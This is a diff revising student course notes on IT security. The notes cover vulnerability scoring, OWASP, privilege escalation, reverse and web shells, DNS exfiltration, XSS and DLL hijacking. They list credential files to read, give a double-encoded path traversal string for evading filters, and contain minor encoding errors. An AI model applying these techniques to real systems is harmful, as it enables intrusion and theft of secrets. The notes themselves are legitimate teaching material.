@@ -1,6 +1,6 @@
-// Compiled with Typst 0.14.2
+// Compiled with Typst 0.15.1
 #import "../template_zusammenf.typ": *
-#import "@preview/chronos:0.2.1"
+#import "@preview/chronos:0.3.0"
 
 #show: project.with(
   authors: ("Jannis Tschan", "Daniel S.", "Joëlle S.", "Nicolas C."),
@@ -14,20 +14,23 @@
 // Import YARA syntax rules
 #set raw(syntaxes: "yara.sublime-syntax")
 
-#hinweis[*Hinweis:* Die Gliederung der Kapitel verläuft grob nach Unterrichtswochen, da aber Ivan gerne mal Themen hin
-  und her geschoben hat, mussten einige Anpassungen vorgenommen werden, damit die Anordnung einigermassen sinnvoll
-  blieb.]
+#set figure(supplement: none)
+
+#hinweis[
+  *Hinweis:* Die Gliederung der Kapitel verläuft grob nach Unterrichtswochen, da aber Ivan gerne mal Themen hin und her
+  geschoben hat, mussten einige Anpassungen vorgenommen werden, damit die Anordnung einigermassen sinnvoll blieb.
+]
 
 = Vulnerability Classification
 #v(-0.5em)
-== CVE
+== Common Vulnerability and Exposures (CVE)
 _Common Vulnerability and Exposures (CVE)_ is a system for uniquely identifying vulnerabilities in _publicly released
 software_. Every classified vulnerability receives a CVE ID in the form `CVE-YEAR-DIGITS`. The system is operated by
 _MITRE Corporation_, with funding from the US Department of Homeland Security.
 
 CVE's are assigned by _CVE Numbering authorities (CNAs)_. Usually, bigger tech companies are their own CNA. Open Source
-Software can be assigned a CVE by their Code Forge service #hinweis[(e.g. GitHub, GitLab)] or by Red Hat #hinweis[(if if
-  the software is used in Red Hat products)]
+Software can be assigned a CVE by their Code Forge service #hinweis[(e.g. GitHub, GitLab)] or by Red Hat #hinweis[(if
+  the software is used in Red Hat products)].
 
 === CVE assignment process
 #grid(
@@ -38,57 +41,63 @@ Software can be assigned a CVE by their Code Forge service #hinweis[(e.g. GitHub
   ],
   [
     4. After a successful review, a CVE ID is reserved
-    + The required fields are filled out with information about the exploit
+    + The required fields in the CVE record are filled out with information about the exploit
     + The CVE record is published
   ],
 )
+
 === CVE Record
-When a CVE gets published, the following information is included in the record:
-- _CVSS_: The severity of the vulnerability
-- _State:_ Reserved #hinweis[(The initial state before publishing)], Published or Rejected
+When a CVE gets published, the following information is included in the CVE record:
+- _CVSS_: The severity of the vulnerability #hinweis[(see @cvss)]
+- _State:_ "Reserved" #hinweis[(The initial state before publishing)], "Published" or "Rejected"
 - _Description:_ A short description of what the vulnerability does
-- _Affected Products and versions:_ If updates for affected software is available, the patched versions are also
-  included
+- _Affected Products and versions:_ Which products can be exploited by the CVE, including a range of affected version numbers.
+  If updates for affected software is available, the patched versions are also included
 - _Used CWEs:_ What CWEs the vulnerability falls into
 - _References:_ Links to further resources, usually advisories on how to mitigate the vulnerability
 
-== CWE
+== Common Weakness Enumeration (CWE)
 _Common Weakness Enumeration (CWE)_ categorizes and classifies software and hardware vulnerabilities based on how they
-exploit weaknesses in software. It does not list specific software, but the techniques used to exploit it. It also
-contains possible mitigations for each weakness.
+exploit weaknesses in software. It does not list specific software, but the techniques used to exploit it.
+It also contains possible mitigations for each weakness.
 
 For example, the three most common CWEs in 2025 were:
 + CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
   #hinweis[(incorrect index/length checks)]
-+ CWE-79: Cross-Site Scripting #hinweis[(Missing or incorrect neutralization of user input when generating web page
-    content)]
++ CWE-79: Cross-Site Scripting
+  #hinweis[(Missing or incorrect neutralization of user input when generating web page content)]
 + CWE-20: Improper Input Validation
 
-== CVSS
-_Common Vulnerability Scoring System (CVSS)_ assigns a vulnerability a score from 0 to 10 based on _how difficult to
-exploit_ and _how much damage_ can be caused with it. The higher the resulting score is, the critical remedying the
-exploit is. A score of 0.1 - 3.9 is considered "Low", 4.0 - 6.9 "Medium", 7.0 - 8.9 "High" and 9.0 - 10.0 "Critical".
+== Common Vulnerability Scoring System (CVSS) <cvss>
+The _Common Vulnerability Scoring System (CVSS)_ assigns a vulnerability a score from 0 to 10 based on _how difficult to
+exploit_ and _how much damage_ can be caused with it. The higher the resulting score, the more critical it is to remedy
+the exploit. A score of 0.1 - 3.9 is considered "Low", 4.0 - 6.9 "Medium", 7.0 - 8.9 "High" and 9.0 - 10.0 "Critical".
 
 The score in CVSS 4.0 is divided into multiple metrics:
 - _Base:_ Characteristics of the vulnerability itself, technical assessment
 - _Threat:_ Current state of exploit techniques or code availability for a vulnerability
-- _Environmental:_ Characteristics that depend on a specific implementation or environment #hinweis[(i.e. impact on the
-    affected organization)]
-- _Supplemental:_ Measures external attributes of a vulnerability #hinweis[(safety of human life, attack is
-    self-replicable, recovery of the system after a attack, highly-valuable target affected, difficulty for consumers to
-    respond to the vulnerability)]
+- _Environmental:_ Characteristics that depend on a specific implementation or environment
+  #hinweis[(i.e. impact on the affected organization)]
+- _Supplemental:_ Measures external attributes of a vulnerability
+  #hinweis[(safety of human life, attack is  self-replicable, recovery of the system after a attack,
+    highly-valuable target affected, difficulty for consumers to respond to the vulnerability)]
 
 #pagebreak()
 
-The base metrics of CVSS 4.0 are as follows:
+The _base metrics_ of CVSS 4.0 are as follows:
 #v(-0.5em)
 #table(
   columns: (auto, 1fr),
   table.header([Metric], [Explanation]),
   [*Attack Vector\ (AV)*],
   [
-    Over which physical way can it be exploited? #hinweis[(_Network_ (over the internet), _Adjacent_ (only "in reach" of
-      e.g. Wi-Fi, Bluetooth), _Interaction_ (user input or SSH), _Physical_ (manipulation of physical machine))]
+    In what physical way can it be exploited?\
+    #hinweis[
+      (_Network_ (over the internet),
+      _Adjacent_ (only "in reach" of e.g. Wi-Fi, Bluetooth),
+      _Local_ (accessing system via mouse/keyboard, remote tools such as SSH or social engineering),
+      _Physical_ (manipulation of physical machine))
+    ]
   ],
 
   [*Attack Complexity\ (AC)*],
@@ -96,19 +105,20 @@ The base metrics of CVSS 4.0 are as follows:
 
   [*Attack Requirements\ (AT)*],
   [
-    Are there any conditions necessary for an attack which the attacker cannot influence? #hinweis[(System must be in a
-      certain state, race condition must be won, etc.)]],
+    Are there any conditions necessary for an attack which the attacker cannot influence?
+    #hinweis[(System must be in a certain state, race condition must be won, etc.)]
+  ],
 
   [*Privileges Required\ (PR)*],
   [
-    Is it required to have any privileges on the target system?
+    Is it required to have any privileges on the target system?\
     #hinweis[(_None_ (unauthenticated), _some_ (regular user), _high_ (admin access))]
   ],
 
   [*User Interaction\ (UI)*],
   [
-    Does the user on the target need to do anything to make the attack possible?
-    #hinweis[(_None_, _passive_ (e.g. accidentally visiting a web site), _active_ (executing a Office macro))]
+    Does the user on the target need to do anything to make the attack possible?\
+    #hinweis[(_None_, _passive_ (e.g. accidentally visiting a web site), _active_ (e.g. placing files in a specific directory)]
   ],
 
   [*Vulnerable System CIA\ impact (VC, VI, VA)*],
@@ -119,31 +129,33 @@ The base metrics of CVSS 4.0 are as follows:
 )
 
 == OWASP Top 10
-The _Open Web Application Security Project (OWASP)_ is a nonprofit foundation that works to improve the security of
+The _Open Web Application Security Project (OWASP)_ is a nonprofit foundation that aims to improve the security of
 (web) software. Every year, it publishes the ten most abused web vulnerabilities. The Top 10 of 2025 are:
-#columns(2)[
-  + Broken Access Control #hinweis[(User accesses or modifies information they shouldn't)]
-  + Security Misconfiguration #hinweis[(unnecessary ports enabled, default credentials, security features disabled)]
-  + Software Supply Chain Failures #hinweis[(Vulnerabilities in used libraries)]
-  + Cryptographic Failures #hinweis[(Bad encryption used, personal data not encrypted)]
-  + Injection #hinweis[(XSS, SQL injection, command injection...)]
-  #colbreak()
-  6. Insecure Design #hinweis[(Bad business logic, missing validation)]
-  + Authentication Failures #hinweis[(Attacker can log in as other user, hard coded credentials)]
-  + Software or Data Integrity Failures #hinweis[(No verification of external resources, e.g. checksums of downloads)]
-  + Security Logging and Alerting Failures #hinweis[(Events not logged, sensitive data in logs, no alerts on unusual
-      behavior)]
-  + Mishandling of Exceptional Conditions #hinweis[(Unexpected/Error conditions lead to crashes or undefined behavior)]
-]
 
-== ASVS
+#grid(
+  [
+    + Broken Access Control #hinweis[(User accesses or modifies information they shouldn't be able to)]
+    + Security Misconfiguration #hinweis[(unnecessary ports enabled, default credentials, security features disabled)]
+    + Software Supply Chain Failures #hinweis[(Vulnerabilities in used libraries)]
+    + Cryptographic Failures #hinweis[(Bad encryption used, personal data not encrypted)]
+    + Injection #hinweis[(XSS, SQL injection, command injection...)]
+  ],
+  [
+    6. Insecure Design #hinweis[(Bad business logic, missing validation)]
+    + Authentication Failures #hinweis[(Attacker can log in as other user, hard coded credentials)]
+    + Software or Data Integrity Failures #hinweis[(No verification of external resources, e.g. checksums of downloads)]
+    + Security Logging and Alerting Failures #hinweis[(Events not logged, sensitive data in logs, no alerts on unusual behavior)]
+    + Mishandling of Exceptional Conditions #hinweis[(Unexpected/Error conditions lead to crashes or undefined behavior)]
+  ],
+)
+
+== ASVS Controls
 The _Application Security Verification Standard (ASVS)_ is a project by OWASP to provide developers with security
 measures (_"controls"_) that are testable.
 
-Why is ASVS needed if OWASP Top 10 exists? The OWASP Top 10 is for awareness only, it is not written for developers --
-while OWASP Top 10 highlights what risks exist, ASVS provides concrete guidance how to prevent them, acting as a
+Why is ASVS needed if OWASP Top 10 exists? The OWASP Top 10 is for awareness only, it is not written for developers.
+While OWASP Top 10 highlights what risks exist, ASVS provides concrete guidance how to prevent them, acting as a
 comprehensive guide for development, testing, and procurement (benchmarking).
-
 
 ASVS compliance is split into multiple levels:
 - _Level 1 (136 controls):_ Minimum acceptable assurance, easy to automate
@@ -155,19 +167,18 @@ ASVS compliance is split into multiple levels:
 #pagebreak()
 
 == Traffic Light Protocol (TLP)
-The Traffic Light Protocol has been developed by Security Researchers to signal the confidentiality of information. It
-is often used when sensitive information is presented, like details of an attack against a company during a
+The _Traffic Light Protocol_ has been developed by security researchers to _signal the confidentiality_ of information.
+It is often used when sensitive information is presented, like details of an attack against a company during a
 (cross-organizational) meeting or a conference.
 
-Different parts of a document can have different TLP levels, like what users are affected can be TLP:RED while details
-about how the attacker got access can be TLP:CLEAR.
-
+Different parts of a document can have different TLP levels: The names of affected users of an exploit can be TLP:RED,
+while details about how the attacker got access can be TLP:CLEAR.
 
 #table(
   columns: (auto, 1fr),
   table.header([Level], [Description]),
   text(fill: red, highlight(fill: black)[*TLP:RED*]),
-  [Information restricted to current participants. Sharing strictly forbidden],
+  [Information restricted to current participants of the meeting/presentation. Sharing strictly forbidden],
 
   text(fill: orange, highlight(fill: black)[*TLP:AMBER*]),
   [Information can be shared within the organization of the receiver only if strictly necessary],
@@ -180,26 +191,29 @@ about how the attacker got access can be TLP:CLEAR.
 )
 
 = Hacking Attacks
-Hacking attacks can target different layer of a target: The OS, the network stack, the services #hinweis[(e.g. Tomcat)]
+Hacking attacks can target different layer of a system: The OS, the network stack, the services #hinweis[(e.g. Tomcat)]
 or the applications running on it. For reconnaissance, attackers use _scanners_ to check targets for vulnerabilities:
 Port scanners #hinweis[(e.g. `nmap`)], TLS testers #hinweis[(e.g. Qualys SSL Test)] or vulnerability scanners
 #hinweis[(e.g. Nessus)]. More than 90% of all vulnerabilities lie on the application-level, the rest lies below.
 
-Hacks can be conducted over IT systems or over humans. Direct attacks are often difficult to execute, so often the
-actual humans are targeted by an attack.
+Hacks can be conducted over IT systems or over humans. Direct attacks of the IT systems are often difficult to execute,
+so it can be easier to target the actual humans in an attack, e.g. through Phishing or Social Engineering.
 
 == Attack types
 #v(-0.5em)
 === Local exploit
-The attacker is already on a host and wants to execute their code with higher privileges #hinweis[(i.e. Windows: User
-  $->$ Local Admin $->$ `SYSTEM`, Unix: User $->$ root)]. This is called _privilege escalation_.
+_Local exploits_ are attacks executed on a target the _attacker has already compromised_ and can run code and commands on.
+The attacker now wants to execute their code with higher privileges
+#hinweis[(e.g. Windows: Regular User $->$ Local Admin $->$ `SYSTEM` user, Unix: User $->$ root)].
+This is called _privilege escalation_.
 
 *Privilege Escalation under Unix systems:*
 #v(-0.5em)
-- _suid:_ A program on a Unix system normally runs with the same permissions as the user who started it. But if the
-  `suid` bit is set in the permissions of the binary, it is _run with the permissions of the owner_ of the file. The
-  most well known programs with `suid` are _`su`_ and _`sudo`_. Programs with `suid` are often targeted by attackers, as
-  compromise of them can give complete control of the system.\
+- _suid:_ A program on a Unix system normally runs with the same permissions as the user who started it. However, if the
+  `suid` bit is set in the permissions of the binary, the program _runs with the owner's permissions_.
+  The most well known programs with `suid` are _`su`_ and _`sudo`_. Programs with `suid` are often targeted by attackers, as
+  compromising them can give complete control of the system.
+  #v(-0.25em)
   ```sh
   $ ls -la /bin/sudo
   -rwsr-xr-x 1 root root 257136 14. Aug 17:41 /bin/sudo  # 's' = suid bit. sudo is ran as root.
@@ -207,27 +221,39 @@ The attacker is already on a host and wants to execute their code with higher pr
   ```
 
 - _Cron Jobs:_ Cron jobs are a way to run scripts and programs on a schedule #hinweis[(every 15 minutes, hourly etc.)].
-  If the target of a cron job has _write permissions for everyone_, any user can modify that script and execute their
-  own commands with it with the permissions of the user set in the cron job. If no user is specified in the cron job, it
-  is ran as `root`.
+  If the target of a cron job #hinweis[(e.g. a shell script)] has _write permissions for everyone_, any user can modify
+  that script and execute their own commands with the permissions of the user set in the cron job.
+  If no user is specified in the cron job, it is ran as `root`. Below is a vulnerable cron job without a user that points
+  to a script writable by anyone.
+  #v(-0.25em)
   ```tab
   0 2 * * 0 /opt/backup.sh # no user set, ran as root. "backup.sh" has "-rw-rw-rw-" permissions
   ```
 
 - _Bad file permissions:_ It is also possible to escalate privileges indirectly by reading files containing sensitive
   information with poorly configured permissions #hinweis[(read permissions for world/everyone)]. The most interesting
-  files on a Unix system are _`/etc/passwd`_ #hinweis[(all users on the system)] and _`/etc/shadow`_ #hinweis[(hashed
-    passwords of users that may be crackable with "John the ripper")] in the system files and various user
-  configurations in either `/home` or `/root`: _`.bash_history`_ #hinweis[(command history, may contain login data that
-    has been typed into the console)] and _`.ssh/id_rsa`_ #hinweis[(private key)].\
-  With these files, the attacker may be able to log into another server with SSH or modify passwords to log in as
-  another user.
+  files on a Unix system are listed below. With their contents, the attacker may be able to log into another server with
+  SSH or modify passwords to log in as another user.
+  #v(-0.5em)
+  #table(
+    columns: (1fr, 1fr),
+    table.header([System files], [User configuration in `/home` or `/root`]),
+    [
+      - _`/etc/passwd`:_ Lists all users on the system
+      - _`/etc/shadow`:_ Hashed passwords of users that may be crackable with "John the Ripper"
+    ],
+    [
+      - _`.bash_history`:_ Command history, may contain login data that has been typed into the console
+      - _`.ssh/id_rsa`:_ Private key(s)
+    ],
+  )
 
 *Privilege Escalation under Windows:*
-- _DLL Hijacking:_ See chapter @dll-hijacking
+- _DLL Hijacking:_ By replacing DLLs loaded by applications, the attacker may be able to gain higher privileges.
+  See chapter @dll-hijacking
 
 === Server-Side/Remote exploit
-The attacker can directly interact with server software on a target host and wants to execute their own code on it --
+The attacker can directly interact with server software on a target host and wants to execute their own code on it
 i.e. trigger a remote code execution vulnerability in the program. Common targets include:
 
 #table(
@@ -238,10 +264,7 @@ i.e. trigger a remote code execution vulnerability in the program. Common target
   [Buffer overflows in command parsing, path traversal, authentication bypasses],
 
   [*DNS*],
-  [
-    Must remain publicly accessible. Compromising DNS can enable MitM-attacks or service disruptions in the entire
-    network
-  ],
+  [Must remain publicly accessible. Compromising DNS can enable MitM-attacks or service disruptions in the entire network],
   [Buffer overflows in query parsing, Cache poisoning #hinweis[(Mitigated with DNSSEC)], Zone transfer vulnerabilities],
 
   [*Web\ server*],
@@ -257,13 +280,13 @@ i.e. trigger a remote code execution vulnerability in the program. Common target
 
 === Client-Side Exploit
 The attacker wants to execute code on a client computer. The easiest method to run your code on a client machine is via
-the browser: JavaScript, WebAssembly, WebGL, image files with embedded code... But there are also other programs that
-download resources from the internet that can be tricked into downloading malicious files #hinweis[(registering an
-  expired domain, modifying a resource where the checksum is not validated)]
+the browser: JavaScript, WebAssembly, WebGL, image files with embedded code...\
+But there are also other programs that download resources from the internet that can be tricked into downloading malicious
+files #hinweis[(e.g. registering an expired domain, modifying a resource where the checksum is not validated)].
 
 == Attack methods
-In this chapter, all attacks that we only looked at a little bit are listed. In the rest of the chapter, some attacks
-are described in more detail.
+This chapter lists all the attacks that we only examined briefly during lectures. The rest of the chapter provides
+more detailed descriptions of some of these attacks.
 
 - _Man-in-the-Middle:_ An attacker inserts themselves into communications of two parties. The attacker can read all
   exchanged messages and send modified messages to the parties. Usually performed with _ARP Spoofing_ or a _reverse
@@ -273,17 +296,17 @@ are described in more detail.
   on the client side #hinweis[(e.g. a bank transaction can look correct to the user, but the MitB-attack intercepted the
     request and changed the receiver of the money)]
 
-- _Indirect Attack:_ The attacker doesn't attack the target directly, but a user or infrastructure that accesses the
-  desired target legitimately. Once the attacker has compromised that intermediate, it can use the existing trust
-  relationship to access the target.
+- _Indirect Attack:_ The attacker doesn't attack the target directly, but instead attacks a user or infrastructure
+  that accesses the desired target legitimately. Once the attacker has compromised that intermediate, it can use the
+  existing trust relationship to access the target.
 
 - _Social Engineering Attack:_ The attacker poses as someone trustworthy #hinweis[(e.g. support of a web service,
     another employee)] to trick the user into giving access, information, or performing actions that compromise
   security.
 
 - _Command & Control (C2):_ With C2, the program executed on the target does not perform any malicious activities on its
-  own. Instead, it contacts an attacker-controlled C2 server that provides further instructions #hinweis[(download
-    malware, exfiltrate data, do nothing)]. Botnets are controlled via C2 servers.
+  own. Instead, it contacts an attacker-controlled C2 server that provides further instructions
+  #hinweis[(download malware, exfiltrate data, do nothing)]. Botnets are controlled via C2 servers.
 
 - _Path Traversal Attack:_ Usually exploited on web servers. Uses the "`../`" pattern in the URL to go one directory up.
   If the server is badly configured, the attacker can access files in the parent directories #hinweis[(e.g.
@@ -291,29 +314,27 @@ are described in more detail.
   `../` pattern can be _double encoded_ in URL Encoding: `%` $=>$ `%25`, `/` $=>$ `%5C`. So with "`%255C..%255C..`",
   simple pattern matching can be defeated.
 
-- _URL Redirections:_ Some websites enable redirecting to another website via a query parameter. For example
-  `https://www.google.com/url?q=github.com` will directly direct to GitHub. If you chain multiple websites together, it
-  can look like a regular link to Google, but it will redirect to a attacker-controlled site.
+- _URL Redirection:_ Some websites enable redirecting to another website via a query parameter. For example
+  `https://www.google.com/url?q=github.com` will directly direct to GitHub. If the attacker chains multiple websites
+  together, it can look like a regular link to Google, but it will redirect to a attacker-controlled site.
 
-#pagebreak()
-
-== Remote Access Trojan (RAT) & RCE
+== Remote Access Trojan (RAT) & Remote Code Execution (RCE) <rat-rce>
 _Remote Code Execution (RCE)_ is considered to be the "holy grail" of exploits, as it allows an attacker to run any code
-they want and is thus the gateway to further control over other infrastructure. An RCE is often used as initial access
+they want and is thus the gateway to gain further control over other infrastructure. An RCE is often used as initial access
 vector and can be achieved through various means: _Command Injection_, _Execution of uploaded files_, _SQL Injection_,
 _Buffer Overflows_...
 
-It's common for initial exploit payloads to be 'single-use'. They execute once and then the process crashes or the
+It's common for initial exploit payloads to be _"single-use"_: They execute once and then the process crashes or the
 context ends. Shells can be used to interactively execute commands and keeping the context on the system. These are
 categorized as _Remote Access Trojans (RAT)_ #emoji.mouse: Programs that allow full control of a machine over a remote
-connection. They are used for long-term access -- used as a tool after the hacker has already a foothold.
+connection. They are used for long-term access; used as a backdoor after the hacker has gained control of a system.
 
 === Web Shell
 #grid(
   align: horizon,
   [
-    A web shell is a type of malware that gets installed on a web server to facilitate shell access for the attacker to
-    it. The attacker _uploads the web shell_ #hinweis[(usually in the language that the server is built on, e.g. PHP)]
+    A web shell is a type of malware that gets installed on a web server to facilitate shell access for the attacker.
+    The attacker _uploads the web shell_ #hinweis[(usually in the language that the server is built on, e.g. PHP)]
     to the server. Due to improper configuration, the _web shell's code is executed_ when the attacker performs a _`GET`
     request_ on the file. The attacker can then interact with the web shell's features, which can be used for data
     theft, DDoS attacks or other attacks on the server.
@@ -327,8 +348,8 @@ connection. They are used for long-term access -- used as a tool after the hacke
 #grid(
   align: horizon,
   [
-    A bind shell provides remote access to another machine by _starting a listener on a network port_ on the victim. The
-    attacker can then _connect directly to that port_ and access the web server's shell to execute commands.
+    A bind shell provides remote access to another machine by _starting a listener on a network port_ on the victim.
+    The attacker can then _connect directly to that port_ and access the web server's shell to execute commands.
 
     Often, the attacker already needs some kind of access to the victim in order to either start a tool like _`netcat`_
     or upload their own bind shell program. They also need to know the address of the server and the port on which the
@@ -345,12 +366,12 @@ connection. They are used for long-term access -- used as a tool after the hacke
   align: horizon,
   [
     A reverse shell is the _opposite of a bind shell_: The attacker creates a listener on a port, while the victim
-    connects to it. Just like the bind shell, the attacker now has shell access on the server.
+    connects to the attackers port. Just like the bind shell, the attacker now has shell access on the server.
 
     The attacker also needs some method of initializing the connection from the victim's side #hinweis[(already existing
-      exploit, social engineering etc.)]. The advantages are that the IP/port to connect to are controlled by the
-    attacker and that the server creates a _outbound connection_, which are usually _not blocked by firewalls_. Often
-    used by APTs and ransomware.
+      exploit, social engineering etc.)]. The advantages are that the IP and port to connect to are controlled by the
+    attacker and that the server creates a _outbound connection_, which are usually _not blocked by firewalls_.
+    Often used by APTs and ransomware.
   ],
   image("img/reverse-shell.png"),
 )
@@ -358,8 +379,8 @@ connection. They are used for long-term access -- used as a tool after the hacke
 == Ransomware
 Ransomware is a type of malware that encrypts data on target systems. Often, the attacker will demand payment in
 exchange for a decryption key. Although it is usually recommended not to pay the ransom, the _attacker will typically
-provide a decryption method_ after receiving payment, as if they are known not to provide one, _no one will pay them
-anymore_.
+provide a decryption method_ after receiving payment. This is because if the attacker are known not to provide one,
+_no one will pay them anymore_ in future attacks.
 
 Backup systems are critical in restoration after a ransomware attack. Central backup software usually operates in one of
 two ways:
@@ -368,9 +389,9 @@ two ways:
 - _Pull principle:_ The backup server initializes the backup job and connects to the clients to create the backup. It
   only requires read-only access to the clients. Doesn't require inbound firewall rules.
 
-In case of a ransomware attack, with the push principle, a infected client could in the worst case _compromise the
-entire backup server_. With the pull model, only the_ backups of the affected client_ created after the infection can be
-corrupted.
+In the event of a ransomware attack, the push principle means that an infected client could, in the worst case,
+_compromise the entire backup server_. With the pull model, however, only the _backups of the affected client_
+created after the infection can be corrupted.
 
 == DNS tunneling
 DNS tunnelling is an attack where DNS queries are abused to transfer data with them. This is done to hide the traffic
@@ -381,11 +402,11 @@ from WAFs and other defense mechanisms.
   [
     A specific attack using DNS tunneling is a _DNS data exfiltration_ attack, which smuggles data out of a network.
 
-    + A file is Base64 encoded and the resulting hash split into small chunks #hinweis[(usually $<$ 512 bytes, as
-        firewalls block larger DNS queries)].
+    + A file is Base64 encoded and the resulting hash split into small chunks
+      #hinweis[(usually $<$ 512 bytes, as firewalls block larger DNS queries)].
     + Send a DNS query to an attacker-controlled domain with the chunk used as a subdomain.
     + Repeatedly send requests. Each fragment is then used as a subdomain
-    + The attacker can concatenate all subdomains from that client's DNS requests.
+    + The attacker can concatenate all subdomains from that client's DNS requests to get the full Base64-encoded file contents.
 
     Note that this can also be done in reverse: e.g. a C2 server sends commands via DNS tunneling to an infected client.
   ],
@@ -412,32 +433,30 @@ DNS tunneling _works slowly_ due to the small size sent with every DNS request. 
 if the queries are sent in quick succession.
 
 === Prevention
-With a _split-horizon DNS_, the download of data via DNS responses can be prevented. There are two DNS servers within
-the network: One that can be reached normally, but only resolves intranet addresses. The other resolves regular internet
-traffic, but can only be reached through a proxy, as it sits in the DMZ.
+With a _split-horizon DNS_, the download of data via DNS responses can be prevented. In a split-horizon setup, there
+are two DNS servers within the network: One that can be reached directly, but only resolves intranet addresses.
+The other resolves regular internet traffic, but can only be reached through a proxy, as it sits in the DMZ.
 
-A split-horizon DNS _can't prevent DNS tunnel exfiltration_ as shown above, but _it can prevent data downloading_ via
-DNS tunneling. Data downloading is usually done by placing the malicious data in the _"Authority"_ or _"Additional"
+While a split-horizon DNS _can't prevent DNS tunnel exfiltration_ as shown above, _it can prevent data downloading_ via
+DNS tunneling. DNS data downloading is usually done by placing the malicious data in the _"Authority"_ or _"Additional"
 section_ of a DNS response. This data is usually not trusted. As such, the proxy in the DMZ _does not forward this data_
 to the client, thus preventing the attack.
 
-The same principle also applies to _DNS over HTTPS_: The DoH server doesn't forward the data to the client.
-
-#pagebreak()
+The same principle also applies to _DNS over HTTPS_: The DoH server doesn't forward this additional data to the client.
 
 == Cross-Site Scripting (XSS)
-Cross-Site Scripting is an attack in which a vulnerable web application is used to execute attacker code on the victim.
-Note that XSS is not Remote Code Execution, as the code stays within the confines of the browser sandbox.
+Cross-Site Scripting is an attack in which a vulnerable web application is used to _execute attacker code_ on the victim.
+Note that XSS is not Remote Code Execution #hinweis[(see chapter @rat-rce)], as the code stays within the confines of the
+browser sandbox.
 
 There are three types of XSS:
-- _Stored XSS:_ The malicious code is stored in the website #hinweis[(e.g. in user comments)], sent to the user and then
-  executed
+- _Stored XSS:_ The malicious code is stored in the website #hinweis[(e.g. `<script>` tags in user-created posts)],
+  sent to the victim on loading the website and then executed by the victim's browser
 - _Reflected XSS:_ Some input #hinweis[(URL parameter, form entry etc.)] is sent to the server and the server responds
-  with the parsed unvalidated input embedded into the response.
+  with the parsed and unvalidated input embedded into the response HTML.
 - _DOM-based XSS:_ Code is injected into the DOM at runtime, for example through a JS function that adds unvalidated
-  input to the DOM. The difference is that the malicious code is not contained in the response from the server, but
-  dynamically added on the client.
-
+  input to the DOM. The difference to the other types is that the malicious code is not contained in the response from
+  the server, but _dynamically added on the client_.
 
 #grid(
   columns: (1fr, auto),
@@ -445,14 +464,14 @@ There are three types of XSS:
     Reflected XSS are the most common type. The classic example is a search bar where the term entered is placed
     directly in the DOM without any escaping. The example below works similarly.
 
-
     + The attacker fills out a form that generates a URL with parameters. Within the fields, the XSS payload is placed.
     + The URL with the XSS in the parameters is created. The attacker either recieves the URL directly or catches the
       network request with developer tools
     + The attacker sends the URL to their victim
     + The victim opens the URL and due to the missing or broken validation, the code within the URL is parsed and
       executed
-    + Depending on the payload, the attacker might exfiltrate some data or do other damage to the victim
+    + Depending on the payload, the attacker might exfiltrate some data #hinweis[(e.g. Cookies)] or do other damage
+      to the victim
 
   ],
   chronos.diagram({
@@ -471,9 +490,9 @@ There are three types of XSS:
 )
 
 
-*Counter measures:* Input validation on the server, Convert user input into HTML entitles, set a Content Security Policy
-#hinweis[(JS can only access cookies from this domain)], use the `Set-Cookie: HttpOnly` HTTP header #hinweis[(avoids
-  leaking cookies through JS altogether)].
+*Counter measures:* Input validation on the server, Convert user input into HTML entities,
+set a Content Security Policy #hinweis[(so JS can only access cookies from the current domain)],
+use the `Set-Cookie: HttpOnly` HTTP header #hinweis[(avoids leaking cookies through JS altogether)].
 
 == DLL Hijacking <dll-hijacking>
 #grid(
@@ -485,8 +504,8 @@ There are three types of XSS:
     with the same name and methods in the application directory and Windows will load and execute that code. Depending
     on the environment, it is possible to get privilege escalation.
 
-    During an attack, a Attacker could send a program to a victim that drops the DLL in the application directory of a
-    vulnerable program. Programs located in `%APPDATA%` or `%LOCALAPPDATA%` are preferred to programs in
+    During an attack, an Attacker could send a program to a victim that drops a malicious DLL in the application
+    directory of a vulnerable program. Programs located in `%APPDATA%` or `%LOCALAPPDATA%` are preferred to programs in
     `C:\Program Files`, as the latter requires admin permissions to write to. Once the victim starts the vulnerable
     program, the malicious DLL is loaded and executed.
 
@@ -499,23 +518,36 @@ There are three types of XSS:
     _par("Victim", display-name: [Windows Client])
 
     _seq("Attacker", "Attacker", comment: [Create malicious DLL])
-    _seq("Attacker", "Victim", comment: [Social Engineering\ Spam-Mail etc.])
+    _seq("Attacker", "Victim", comment: [Social Engineering\ (Spam mail etc.)])
     _seq("Victim", "Victim", comment: [Run program that\ drops DLL], flip: true)
     _seq("Attacker", "Victim", comment: [Motivate victim to start\ program that loads DLL])
-    _seq("Victim", "Victim", comment: [Starts program, \ malicious DLL loaded], flip: true)
+    _seq("Victim", "Victim", comment: [Starts program,\ malicious DLL loaded], flip: true)
     _seq("Victim", "Attacker", comment: [e.g. Reverse Shell])
   }),
 )
-
 
 == Advanced Persistent Threat (APT)
 _Advanced Persistent Threats (APT)_ are well-equipped hacking groups with sheer limitless resources, usually
 state-funded. They execute large-scale, targeted attacks on organizations and governments that are often politically
 motivated by the governments behind them. They create their malware in-house, often on top of unknown zero-day exploits.
-The time frame from initial infection up to discovery can last years, as they usually move slowly and have multiple back
-doors into targets.
+The time frame from initial infection up to discovery can last years, as they usually move slowly and have multiple
+backdoors into targets.
 
-=== Example Attack with Patch Gap
+An APT attack usually goes through the following phases, each can last months or years:
+#grid(
+  [
+    + Infection
+    + Persistence
+    + Exfiltration
+  ],
+  [
+    4. Privilege Elevation
+    + Further Exfiltration with new privileges
+    + Increase network access
+  ],
+)
+
+=== Example APT-style attack with C2
 #align(center)[
   #chronos.diagram({
     import chronos: *
@@ -525,27 +557,17 @@ doors into targets.
     _par("Target")
 
     _seq("Attacker", "Target", comment: [Phishing mail with download link])
-    _seq("Attacker", "Target", comment: [Downloads legitimate software, no malware activity])
+    _seq("Attacker", "Target", comment: [Downloads legitimate software with C2 functionality,\ no malware activity yet])
     _seq("Target", "C2", comment: [Software checks for "updates"])
     _seq("C2", "Target", comment: [Sends command "Sleep for 90 days"])
-    _seq("Target", "C2", comment: [Another update check after 90 days])
+    _seq("Target", "C2", comment: [Another "update" check after 90 days])
     _seq("C2", "C2", comment: [Condition met], flip: true)
     _seq("C2", "Target", comment: [Send malware code])
     _seq("Target", "Target", comment: [Execute,\ gain local admin], flip: true)
   })
 ]
 
-An APT attack usually goes through the following phases, each can last months or years:
-#columns(2)[
-  + Infection
-  + Persistence
-  + Exfiltration
-  #colbreak()
-  4. Privilege Elevation
-  + Further Exfiltration with new privileges
-  + Increase network access
-]
-
+=== Patch Gap
 When a vulnerability gets discovered, there is often an exploit available before a patch is applied to all clients. The
